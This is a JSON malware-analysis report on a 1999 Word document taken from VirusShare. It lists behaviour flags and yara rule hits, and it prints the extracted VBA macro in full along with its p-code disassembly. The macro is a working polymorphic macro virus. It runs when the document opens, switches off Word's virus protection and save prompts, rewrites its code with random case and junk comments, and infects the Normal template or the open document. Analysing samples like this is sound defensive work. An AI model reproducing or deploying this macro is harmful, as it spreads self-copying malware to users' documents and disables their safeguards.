{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "addfromstring": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub Document_Open() '\nDim v(175): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '\nSet a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '\nSet abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '\nIf MacroContainer = s Then Set s = ActiveDocument '\nSet nh = s.VBProject.VBComponents(1).CodeModule: li = abc.countoflines: y = 100 + Int(Rnd * 50) '\nFor i = 1 To li: jc = \"\": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '\nIf p = 1 And li > y Then '\nd = 1: GoTo n_ '\nEnd If '\nl = UCase(Left(abc.Lines(i, 1), (p - 1))) '\nFor o = 1 To Len(l): f = Mid(l, o, 1) '\nIf Asc(f) < 90 And Asc(f) > 65 Then f = Chr(Asc(f) + Int(Rnd * 2) * 32) '\nv(i) = v(i) & f: Next o '\nFor j = 1 To Int(75 - (Rnd * 20)): jc = jc & Chr(255 - Int(Rnd * 100)): Next j '\nv(i) = v(i) & t & jc '\nIf d = 2 Then v(i) = v(i) & vbCr & t & jc '\nvc = vc & v(i) & vbCr '\nn_: '\nNext i '\nIf nh.countoflines < (1 + 1 + 2) Then '\nnh.deletelines 1, nh.countoflines: nh.addfromstring vc: nh.deletelines nh.countoflines, 1 '\nIf ActiveDocument.Saved = (Rnd * 0) Then ActiveDocument.SaveAs ActiveDocument.FullName '\nEnd If '\nEnd Sub '\nRem PiE by jack twoflower/Lz0/Meta '\n\n' Processing file: VirusShare_386eedcde629b9c67e742eea3a8e8f22\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3275 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Open())\n' \tQuoteRem 0x001C 0x0000 \"\"\n' Line #1:\n' \tDim \n' \tOptionBase \n' \tLitDI2 0x00AF \n' \tVarDefn v\n' \tBoS 0x0000 \n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tLd Options \n' \tMemSt VirusProtection \n' \tBoS 0x0000 \n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' \tQuoteRem 0x0056 0x0000 \"\"\n' Line #2:\n' \tSetStmt \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tSet a \n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd a \n' \tArgsMemLd VBComponents 0x0001 \n' \tSet ab \n' \tQuoteRem 0x003D 0x0000 \"\"\n' Line #3:\n' \tSetStmt \n' \tLd ab \n' \tMemLd CodeModule \n' \tSet abc \n' \tBoS 0x0000 \n' \tSetStmt \n' \tLd NormalTemplate \n' \tSet s \n' \tBoS 0x0000 \n' \tLitDI2 0x0027 \n' \tArgsLd Chr 0x0001 \n' \tSt t \n' \tQuoteRem 0x003D 0x0000 \"\"\n' Line #4:\n' \tLd MacroContainer \n' \tLd s \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd ActiveDocument \n' \tSet s \n' \tEndIf \n' \tQuoteRem 0x0032 0x0000 \"\"\n' Line #5:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd s \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tSet nh \n' \tBoS 0x0000 \n' \tLd abc \n' \tMemLd countoflines \n' \tSt li \n' \tBoS 0x0000 \n' \tLitDI2 0x0064 \n' \tLd Rnd \n' \tLitDI2 0x0032 \n' \tMul \n' \tFnInt \n' \tAdd \n' \tSt y \n' \tQuoteRem 0x0060 0x0000 \"\"\n' Line #6:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd li \n' \tFor \n' \tBoS 0x0000 \n' \tLitStr 0x0000 \"\"\n' \tSt jc \n' \tBoS 0x0000 \n' \tLd Rnd \n' \tLitDI2 0x0003 \n' \tMul \n' \tFnInt \n' \tSt d \n' \tBoS 0x0000 \n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd abc \n' \tArgsMemLd Lines 0x0002 \n' \tLd t \n' \tFnInStr \n' \tSt p \n' \tQuoteRem 0x004A 0x0000 \"\"\n' Line #7:\n' \tLd p \n' \tLitDI2 0x0001 \n' \tEq \n' \tLd li \n' \tLd y \n' \tGt \n' \tAnd \n' \tIfBlock \n' \tQuoteRem 0x0019 0x0000 \"\"\n' Line #8:\n' \tLitDI2 0x0001 \n' \tSt d \n' \tBoS 0x0000 \n' \tGoTo n_ \n' \tQuoteRem 0x000F 0x0000 \"\"\n' Line #9:\n' \tEndIfBlock \n' \tQuoteRem 0x0007 0x0000 \"\"\n' Line #10:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd abc \n' \tArgsMemLd Lines 0x0002 \n' \tLd p \n' \tLitDI2 0x0001 \n' \tSub \n' \tParen \n' \tArgsLd LBound 0x0002 \n' \tArgsLd UCase 0x0001 \n' \tSt l \n' \tQuoteRem 0x002A 0x0000 \"\"\n' Line #11:\n' \tStartForVariable \n' \tLd o \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd l \n' \tFnLen \n' \tFor \n' \tBoS 0x0000 \n' \tLd l \n' \tLd o \n' \tLitDI2 0x0001 \n' \tArgsLd Mid$ 0x0003 \n' \tSt False \n' \tQuoteRem 0x0026 0x0000 \"\"\n' Line #12:\n' \tLd False \n' \tArgsLd Asc 0x0001 \n' \tLitDI2 0x005A \n' \tLt \n' \tLd False \n' \tArgsLd Asc 0x0001 \n' \tLitDI2 0x0041 \n' \tGt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLd False \n' \tArgsLd Asc 0x0001 \n' \tLd Rnd \n' \tLitDI2 0x0002 \n' \tMul \n' \tFnInt \n' \tLitDI2 0x0020 \n' \tMul \n' \tAdd \n' \tArgsLd Chr 0x0001 \n' \tSt False \n' \tEndIf \n' \tQuoteRem 0x0048 0x0000 \"\"\n' Line #13:\n' \tLd i \n' \tArgsLd v 0x0001 \n' \tLd False \n' \tConcat \n' \tLd i \n' \tArgsSt v 0x0001 \n' \tBoS 0x0000 \n' \tStartForVariable \n' \tLd o \n' \tEndForVariable \n' \tNextVar \n' \tQuoteRem 0x0018 0x0000 \"\"\n' Line #14:\n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x004B \n' \tLd Rnd \n' \tLitDI2 0x0014 \n' \tMul \n' \tParen \n' \tSub \n' \tFnInt \n' \tFor \n' \tBoS 0x0000 \n' \tLd jc \n' \tLitDI2 0x00FF \n' \tLd Rnd \n' \tLitDI2 0x0064 \n' \tMul \n' \tFnInt \n' \tSub \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tSt jc \n' \tBoS 0x0000 \n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tNextVar \n' \tQuoteRem 0x004F 0x0000 \"\"\n' Line #15:\n' \tLd i \n' \tArgsLd v 0x0001 \n' \tLd t \n' \tConcat \n' \tLd jc \n' \tConcat \n' \tLd i \n' \tArgsSt v 0x0001 \n' \tQuoteRem 0x0015 0x0000 \"\"\n' Line #16:\n' \tLd d \n' \tLitDI2 0x0002 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd i \n' \tArgsLd v 0x0001 \n' \tLd vbCr \n' \tConcat \n' \tLd t \n' \tConcat \n' \tLd jc \n' \tConcat \n' \tLd i \n' \tArgsSt v 0x0001 \n' \tEndIf \n' \tQuoteRem 0x002A 0x0000 \"\"\n' Line #17:\n' \tLd vc \n' \tLd i \n' \tArgsLd v 0x0001 \n' \tConcat \n' \tLd vbCr \n' \tConcat \n' \tSt vc \n' \tQuoteRem 0x0016 0x0000 \"\"\n' Line #18:\n' \tLabel n_ \n' \tQuoteRem 0x0004 0x0000 \"\"\n' Line #19:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' \tQuoteRem 0x0007 0x0000 \"\"\n' Line #20:\n' \tLd nh \n' \tMemLd countoflines \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tAdd \n' \tLitDI2 0x0002 \n' \tAdd \n' \tParen \n' \tLt \n' \tIfBlock \n' \tQuoteRem 0x0026 0x0000 \"\"\n' Line #21:\n' \tLitDI2 0x0001 \n' \tLd nh \n' \tMemLd countoflines \n' \tLd nh \n' \tArgsMemCall deletelines 0x0002 \n' \tBoS 0x0000 \n' \tLd vc \n' \tLd nh \n' \tArgsMemCall addfromstring 0x0001 \n' \tBoS 0x0000 \n' \tLd nh \n' \tMemLd countoflines \n' \tLitDI2 0x0001 \n' \tLd nh \n' \tArgsMemCall deletelines 0x0002 \n' \tQuoteRem 0x005A 0x0000 \"\"\n' Line #22:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tLd Rnd \n' \tLitDI2 0x0000 \n' \tMul \n' \tParen \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' \tQuoteRem 0x0057 0x0000 \"\"\n' Line #23:\n' \tEndIfBlock \n' \tQuoteRem 0x0007 0x0000 \"\"\n' Line #24:\n' \tEndSub \n' \tQuoteRem 0x0008 0x0000 \"\"\n' Line #25:\n' \tRem 0x0021 \" PiE by jack twoflower/Lz0/Meta '\"\n"
    },
    "filename": "VirusShare_386eedcde629b9c67e742eea3a8e8f22",
    "filesize": 28160,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Unbekannt, Template: Normal, Last Saved By: Unbekannt, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Thu Jul  8 10:40:00 1999, Last Saved Time/Date: Thu Jul  8 10:41:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "386eedcde629b9c67e742eea3a8e8f22",
        "sha1": "486a0b8484c3582352332745c148d1d638ba53bf",
        "sha256": "155817674c9bd137f304a0371e4eacd860b80164adbae5895f868a437ad9680d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            ". A!",
            "B7B7",
            "Unbekannt",
            "Normal",
            "Unbekannt",
            "Microsoft Word 8.0",
            "^}%\u027e",
            "Unbekannt",
            "Titel",
            "_PID_GUID",
            " ?\"?",
            " PiE by jack twoflower/Lz0/Meta '",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Open()",
            "Dim ",
            "v(175): ",
            "Options.",
            "VirusPro",
            "W(Rn d * 0",
            "Save",
            ",Set a",
            "acroCont",
            "ainer.VB",
            "Compons(1",
            "b.CodeModule",
            ": @Chr(39",
            "s Then",
            "2A7ve",
            "-nhOA",
            "bc.count",
            "9s: y",
            "100 + I$nt",
            "O50%Fo",
            "1 To  li: j8\"\": ~",
            "@InStr(",
            "(i, 1), t",
            "1 Ag=\">@",
            "1:H Go",
            "n_A7E",
            "UC (LeftO",
            "(p -",
            ")F,o",
            "B,*L",
            "Mid(l, oA$",
            "Asc(f) 0< 90$",
            "> |65^",
            "(v(i",
            "& f: Next oA",
            "#K75",
            "Y820)",
            "t &a2",
            "vbCr",
            "F%|(1Ea",
            "d eleteJ 1",
            "add fromsng vc",
            "_.!z",
            "Full?b",
            "m PiE by",
            " jack tw",
            "eower/Lz@0/Meta",
            "43784722d",
            "$5)5",
            "Wordk",
            "Win16~",
            "Win32",
            "Projekt1A",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Document_Open",
            "Documentj",
            "Options",
            "VirusProtectionoD",
            "RndR",
            "SaveNormalPrompt\u02bc",
            "MacroContainer>",
            "VBProjectOh",
            "ab|\\",
            "VBComponents",
            "abcr",
            "CodeModule",
            "NormalTemplateq",
            "ChrK~",
            "ActiveDocument\\",
            "nhc^",
            "countoflines!\\",
            "Lines",
            "n_z^",
            "UCase5",
            "Asc!u",
            "vbCr",
            "deletelines",
            "addfromstring",
            "Savedd",
            "SaveAsf;",
            "FullName\u041e",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "Tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F989D",
            "63A0-2F3",
            "5-11D3-9",
            "F403393BF25",
            ".TWD#Microsoft ",
            "` Ob",
            " Library",
            "3,PJP\\VBE",
            "\\(EX(.E",
            "CxN@UalCxNTax",
            " +\t,C",
            "OfficDO@f",
            "G{2DF8",
            "D04C-5BF",
            "A-101B-BHDE5",
            "fAA@4",
            "fPROGR",
            "<ICRO",
            "SOFT OFF",
            "ICE\\",
            "MSO97.DLLHj\"P 8.0j",
            "hisDocum",
            "h@5s",
            "\"?\"B",
            "ThisDocument",
            "ID=\"{FBEE3528-3529-11D3-9923-00403393BF25}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"8D8F15AA2F3333333333333333\"",
            "DPB=\"1A18823D0E3E0E3E0E\"",
            "GC=\"A7A53FB041B0CFB1CFB130\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=66, 66, 515, 404, Z",
            "Microsoft Word-Dokument",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.289854",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
